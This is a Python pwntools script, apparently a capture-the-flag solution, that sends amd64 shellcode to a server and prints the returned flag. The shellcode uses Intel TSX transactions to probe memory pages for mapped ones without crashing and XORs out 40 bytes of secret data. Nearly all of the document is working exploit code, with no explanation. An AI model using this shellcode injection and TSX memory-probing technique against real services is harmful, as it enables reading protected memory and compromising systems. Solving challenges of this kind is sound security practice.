#!/usr/bin/env python
from pwn import *

shellcode = asm("""
/* rdi: mempages, rsi: buf */
    mov r8, 64  /* #pages       */
    mov r9, 128 /* retry count  */
L_PAGECHECK:
    mov eax, 0x80000000
    cpuid
    xbegin L_RETRY
    testb [rdi], 0
    xend

    mov rcx, 40 /* flag length  */
L_XORBYTE:
    mov al, [rdi+rcx-1]
    xor [rsi+rcx-1], al
    loop L_XORBYTE
    jmp L_NEXT

L_RETRY:
    cmp r9, 0
    jz L_NEXT
    dec r9
    jmp L_PAGECHECK
L_NEXT:
    mov r9, 128 /* retry count  */
    add rdi, 4096
    dec r8
    jnz L_PAGECHECK

    mov rax, 1
    mov rdi, 1
    mov rdx, 40
    syscall     /* write(1, buf, 40) */
    ret
""", arch="amd64")

if args.RHOST:
    target = remote(args.RHOST, 10101)
else:
    target = process("build/server")
cpuinfo_flags = target.recvline()
assert cpuinfo_flags.find("rtm") != -1
target.send(shellcode)
target.shutdown("send")
print("FLAG: " + target.recv(40))
target.close()
